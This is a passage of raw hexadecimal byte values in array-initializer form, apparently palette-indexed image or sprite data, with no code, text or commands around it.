0x12, 0xE8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0xE6, 0xE4, 0xE4, 0xE3, 0xE4,
0xE4, 0xE4, 0xE3, 0xE2, 0xC9, 0x12, 0x12, 0x12, 0xCA, 0x13, 0xE3, 0xE3, 0xE6, 0xE6, 0xE7, 0xE7,
0xE7, 0xEA, 0xEA, 0xEA, 0xEA, 0xEA, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE5, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE3, 0x13, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0xE8, 0xE8, 0xE8, 0xE6, 0xE5, 0xE5, 0xE5, 0xE6,
0xE6, 0xE6, 0xE8, 0x12, 0xCE, 0x08, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x9F, 0x14, 0x14, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9A, 0x16, 0x9B, 0x9B, 0x9B, 0x08, 0xE3,
0xC9, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xE0, 0xE0, 0xE0, 0xE1, 0xE0, 0xE0, 0xE0, 0xE0, 0xC9, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9,
0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xE0, 0xE0, 0xE1, 0xE1, 0xE1, 0xE1, 0xE2, 0xE1, 0xE1, 0xE1,
0xE1, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x14, 0x14, 0x9E, 0x9D, 0x9D, 0x9D,
0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9E, 0x9E, 0x9E, 0x9D, 0x9C, 0x9C, 0x08, 0xCF, 0x11, 0x12, 0x13, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE4, 0x13, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE4, 0xE4, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12, 0xCF,
0xE6, 0xE6, 0xE6, 0xCE, 0xCE, 0xCE, 0xE7, 0x13, 0x13, 0xCF, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xD0,
0xD0, 0xD0, 0xD0, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12, 0x11, 0xCA, 0xE4, 0x14, 0xE4, 0x14, 0x14,
0x14, 0xE4, 0xE3, 0xCA, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE2, 0xE3, 0xE4, 0xE4, 0x14, 0x14, 0xE5,
0xE6, 0xE7, 0xE9, 0xE8, 0xE9, 0xE9, 0xE9, 0xE9, 0xE9, 0xE9, 0xE9, 0xE7, 0xE6, 0xE5, 0xE5, 0xE4,
0xE3, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE3, 0xE4, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x12, 0xCE, 0xE8,
0xCF, 0x12, 0x12, 0xE8, 0xE8, 0xE8, 0x12, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xE8, 0xE6, 0xE7, 0xE6,
0xE6, 0xE7, 0xCF, 0x12, 0xCF, 0x08, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9B, 0x9D, 0x9B, 0x9A, 0x9A, 0x9B, 0x9A, 0x14, 0xE2, 0xC9,
0xC9, 0xCA, 0xCA, 0xC9, 0xC9, 0xE0, 0xE0, 0xE0, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9,
0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0xE1, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x98,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x9B, 0x9D, 0x9D, 0x9B,
0x9E, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9E, 0x14, 0x12, 0x11, 0x12, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE3, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0xCA, 0x08, 0x9B, 0x9D, 0x9B, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x14, 0xCE, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xE4,
0x14, 0x14, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xCA, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x12, 0x12, 0xD1, 0xD1, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0x12, 0x11, 0x12, 0xE5, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0xE4, 0xE3, 0xCA, 0x12, 0x12, 0x12, 0x12, 0xE1, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0xE5, 0x13, 0x13, 0xE9, 0xE9, 0xE9, 0x13, 0xE9, 0xE9, 0xE9, 0xE9, 0xE7, 0xE5, 0xE5, 0xE4, 0x14,
0xE4, 0xE4, 0xE4, 0xE3, 0xE4, 0xE4, 0xE4, 0xE4, 0x13, 0x11, 0x11, 0x11, 0x12, 0xCE, 0x13, 0xE8,
0xCF, 0x12, 0x12, 0x12, 0xE7, 0xE7, 0xE8, 0x12, 0x12, 0x12, 0x11, 0x12, 0xCF, 0xE7, 0xE7, 0xE7,
0xE6, 0xE6, 0xE7, 0xCF, 0xCE, 0x08, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9B, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9B, 0x08, 0x08, 0x9E, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A, 0x14, 0xE3, 0xE2, 0xCA,
0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xDF,
0xDF, 0xDF, 0xDF, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE2, 0xE3, 0x14, 0x14, 0x14, 0x08, 0x14, 0xE3,
0x14, 0x14, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08, 0x9A, 0x9B, 0x9C, 0x9C,
0x9C, 0x9C, 0x9D, 0x9D, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E,
0x9A, 0x9E, 0x9E, 0x9B, 0x9D, 0x08, 0xE4, 0x12, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4,
0xE3, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xE5, 0x08, 0x9E, 0x9A, 0x9A, 0x9A,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x14, 0xCF, 0x11, 0x11, 0x11, 0x12, 0x13, 0x14,
0x14, 0x14, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xD0, 0xD0,
0xD0, 0xD0, 0xD0, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x11, 0xCF, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0xE2, 0xCA, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0x13, 0x13,
0x14, 0x14, 0x14, 0xE5, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0xE4, 0x14, 0x14, 0x14,
0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0x12, 0x11, 0x11, 0x12, 0x13, 0x13, 0x13, 0xCF,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0xCF, 0xE8, 0xE7, 0xE8,
0xCF, 0xE7, 0xCF, 0x12, 0xCF, 0x08, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x9D,
0x08, 0xE4, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE3, 0xCA, 0xCA, 0xC9, 0xC9,
0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0xC9, 0x12, 0xC9, 0xE0, 0xE0, 0xE1, 0xE1, 0xE0, 0xE1, 0xE2, 0xE2, 0xE3, 0x14, 0x99, 0x99, 0x14,
0x14, 0x14, 0xE2, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0x08, 0x9B, 0x9B, 0x9A,
0x9A, 0x9A, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x9E, 0xCD, 0x12, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4,
0xE2, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x14, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x14, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE5, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x12, 0x12, 0xCF, 0xD1, 0xD1, 0xD0, 0x12,
0x12, 0xCF, 0xCF, 0xCF, 0xE7, 0xE7, 0xCF, 0x11, 0x12, 0xE6, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0xE3, 0xE3, 0xE2, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE2,
0x14, 0x14, 0x14, 0xE5, 0x13, 0x13, 0x13, 0xE3, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x13, 0x11, 0x11, 0x11, 0x12, 0x13, 0x13, 0xE8, 0xCF,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xE8, 0xE8, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0xD0,
0xCF, 0xE8, 0xCF, 0x12, 0xCF, 0x14, 0x9F, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x9E, 0x08,
0xE4, 0xCD, 0xCD, 0xCD, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0xE3, 0xE2, 0xCA, 0xC9, 0xC9, 0xC9, 0x12,
0xC9, 0xC9, 0xE0, 0xE0, 0xE0, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0x14, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0x08, 0x08, 0x14, 0x14, 0xE3, 0xCA, 0xCA, 0xCA, 0x14,
0x99, 0x9B, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x08, 0xCA, 0x11, 0x12, 0xCA, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE3, 0xE3, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0xE3,
0xCA, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xCF, 0x08, 0x17, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9E, 0x9F, 0x08, 0x08, 0xE4, 0xCE, 0x11, 0x11, 0x11, 0x11, 0xE7, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE5, 0xE8, 0x11, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x12, 0xE8, 0xE8, 0xE8, 0xE9, 0xE8, 0xCF,
0xCF, 0xE8, 0xCF, 0xCF, 0xE8, 0xCF, 0x12, 0x11, 0x12, 0xE5, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE3, 0xE3, 0xE4, 0xE3, 0xE2, 0xE1, 0xCA, 0xCA, 0xCA, 0x13, 0xE3, 0xE4, 0x14,
0x14, 0xE4, 0xE3, 0x13, 0xE3, 0xE4, 0xE5, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE4, 0xE4, 0xE4, 0xE2, 0x12, 0x11, 0x11, 0x12, 0xE7, 0xE8, 0xE7, 0xE6, 0xCF,
0xCF, 0xCF, 0xCF, 0x11, 0x11, 0x11, 0x12, 0xE8, 0xCF, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x11, 0x12, 0xE6, 0xE4, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x86, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x08, 0x08,
0xE4, 0xCD, 0xCE, 0xCD, 0xE5, 0xE5, 0xE4, 0xE4, 0xE3, 0xCA, 0xC9, 0xCA, 0xC9, 0xC9, 0xC9, 0xC9,
0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC9, 0xE0, 0xE0, 0xC9, 0xE0, 0xE0, 0xE0, 0xE2, 0xE3, 0xE2, 0xE0, 0xE2, 0x14, 0x14,
0x08, 0x98, 0x08, 0x14, 0x14, 0x08, 0xE3, 0xC9, 0xE3, 0x14, 0x14, 0xE3, 0xCA, 0x12, 0x12, 0x12,
0x12, 0xC9, 0xE4, 0x08, 0x9A, 0x9B, 0x9C, 0x9D, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0xE4, 0x12, 0x11, 0x12, 0xCA, 0xE3, 0xE4, 0xE4, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE2,
0xCA, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x9E, 0x9C, 0x9D, 0x9B, 0x9B, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x14, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE5, 0x08, 0x08,
0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0x12, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x11, 0x00, 0x00, 0x11, 0x12, 0xCF, 0xE8, 0xE8, 0xE8, 0xE8, 0xD1, 0xD1,
0xCF, 0xCF, 0xCF, 0xE8, 0xE7, 0xCF, 0x12, 0x12, 0x13, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE4, 0xE4, 0xE4, 0xE3, 0xCA, 0x11, 0x11, 0x12, 0x13, 0xE6, 0xE7, 0xE6, 0xE7, 0xCF,
0x12, 0x12, 0xD0, 0x00, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xD1, 0x12, 0x11,
0x12, 0x12, 0x11, 0x11, 0x11, 0xCE, 0x14, 0x14, 0x14, 0x14, 0x87, 0x86, 0x86, 0x86, 0x86, 0x86,
0x86, 0x86, 0x87, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08,
0x14, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0xE4, 0xE6, 0x13, 0xCA, 0xE2, 0xE2, 0xE0, 0xC9, 0xC9, 0xCA,
0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC9, 0x12, 0x12, 0xE0, 0xE2, 0xE2, 0xE3, 0xE3, 0xE1, 0xE0, 0xE1, 0xE3,
0x14, 0x14, 0x08, 0xE4, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE2, 0xC8, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC9, 0xE1, 0xE4, 0x99, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E,
0x9D, 0x9D, 0x9C, 0x9D, 0x9E, 0xE4, 0x12, 0x11, 0x11, 0x12, 0x12, 0xC9, 0x12, 0xC9, 0xC9, 0xC9,
0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0xC9, 0xC9, 0xC9, 0xE0, 0xE0, 0xE0, 0xE1, 0x13, 0xCA, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE5, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x14, 0xE6, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE6, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE5, 0xE4, 0xE4, 0x14, 0xE4, 0xE4, 0xE4, 0xE4,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE4, 0xE4, 0xE5, 0xE6, 0x12, 0x11, 0x11, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x11, 0x11, 0x11, 0xE6, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x86, 0x86, 0x86,
0x86, 0x86, 0x86, 0x86, 0x86, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x9E, 0x9E,
0x08, 0x08, 0x08, 0x08, 0x08, 0xE4, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xE0, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3, 0xE3, 0xE2, 0xE2,
0xE2, 0xE3, 0x14, 0x98, 0x08, 0xE3, 0xE2, 0xE2, 0xE2, 0xE2, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xC9, 0xCA, 0xE1, 0xE1, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0xCE, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x14, 0x9A, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9F, 0x08, 0x08, 0x08, 0x08, 0xE4, 0x12, 0x12, 0x11, 0x11, 0x11, 0xCE, 0x14, 0x14, 0x14,
0x14, 0xE4, 0xE5, 0xE5, 0xE6, 0xE6, 0xE7, 0x12, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x13, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE4, 0xE4, 0xE3, 0xE4, 0xE3, 0xCF, 0x11, 0x00, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F, 0x08, 0x08, 0x08, 0x9A, 0x9B, 0x9C, 0x17, 0x9D,
0x08, 0x08, 0x08, 0x14, 0x13, 0x12, 0xC9, 0xCA, 0xCA, 0xCA, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
